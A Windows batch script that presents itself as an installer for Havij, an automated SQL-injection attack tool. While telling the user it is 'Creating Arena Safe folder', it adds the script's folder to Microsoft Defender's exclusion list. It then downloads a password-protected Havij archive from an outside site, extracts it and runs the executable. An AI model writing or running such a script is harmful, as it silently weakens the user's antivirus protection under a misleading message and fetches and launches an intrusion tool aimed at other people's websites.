@echo off
Title Arena Havij Installer

:: Get the current script path
set "SCRIPT_PATH=%~dp0"

echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo 	Havij Installer by Arena Web Security
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo.
echo Creating Arena Safe folder
echo.

powershell -Command "Add-MpPreference -ExclusionPath \"%SCRIPT_PATH%\""

cd /d "%SCRIPT_PATH%"

echo.
echo Do You Want To Download WinRAR?
echo.

pause
:: Download WinRar using PowerShell
::powershell -Command "Invoke-WebRequest https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-711.exe -OutFile .\winrar-x64-711.exe"

start msedge.exe https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-711.exe

pause

::"%SCRIPT_PATH%\winrar-x64-711.exe"


echo.
echo Do You Want To Download Havij?
echo.

pause

:: Download Havij using PowerShell
powershell -Command "Invoke-WebRequest https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip -OutFile .\Havij_1.12_Free.zip"


pause

:: Extract the ZIP using WinRAR
set zipFile=%~dp0Havij_1.12_Free.zip
set password=darknet123

"C:\Program Files\WinRAR\WinRAR.exe" x -p"%password%" "%zipFile%" "%~dp0"

if %errorlevel% equ 0 (
    echo Extraction successful.
) else if %errorlevel% equ 1 (
    echo Incorrect password.
) else if %errorlevel% equ 2 (
    echo File not found.
) else (
    echo Extraction failed with error code %errorlevel%.
)

pause

echo.
echo Starting Havij
echo.

"%SCRIPT_PATH%\Havij 1.12 Free.exe"

pause

:: Optionally, reset the directory
cd /d "%~dp0"
